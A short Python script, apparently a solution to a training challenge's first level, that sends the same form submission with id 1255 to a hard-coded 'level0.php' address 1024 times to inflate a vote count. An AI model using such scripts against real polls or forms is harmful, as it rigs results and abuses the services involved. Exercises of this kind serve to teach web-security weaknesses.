#!/usr/bin/python3

import requests

r = requests 
url = 'http://158.69.76.135/level0.php'

with r.session() as req:
    my_obj = {"id" : 1255, "holdthedoor": "submit"}

    for num in range(1024):
        req.post(url, my_obj)
